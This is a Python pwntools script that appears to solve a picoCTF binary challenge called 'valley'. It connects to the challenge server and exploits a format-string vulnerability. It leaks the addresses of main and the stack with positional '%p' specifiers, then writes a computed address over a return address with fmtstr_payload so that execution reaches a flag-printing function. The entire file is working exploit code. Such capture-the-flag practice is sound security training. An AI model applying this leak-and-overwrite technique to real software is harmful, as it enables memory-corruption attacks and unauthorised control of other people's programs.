from pwn import *

context.log_level="DEBUG"
context.binary=ELF("./valley")

# Start the process
p = remote('shape-facility.picoctf.net', 58316)
#p = process("./valley")

# First line is just introduction
print(p.recv())

def send_payload(payload):
    p.sendline(payload)
    return p.recv()
format_string = FmtStr(execute_fmt=send_payload)
print(format_string.offset)

# leak address of main
p.sendline(b"%21$p")
leaked_main = p.recv().decode("utf-8").strip()[27:]
leaked_main = int(leaked_main, 16)
leaked_main -= 426 # offset

# leaked address of stack
p.sendline(b"%20$p")
leaked_stack = p.recv().decode("utf-8").strip()[27:]
leaked_stack = int(leaked_stack, 16)
leaked_stack -= 8 # offset

print(hex(leaked_main))
print(hex(leaked_stack))

# Craft the payload to write the new value to the specified address
payload = fmtstr_payload(format_string.offset, {leaked_stack: leaked_main}, write_size="short")
p.sendline(payload)
print(p.recv())

# make the function return, and end up in the print_flag
p.sendline(b"exit")
print(p.recvall())
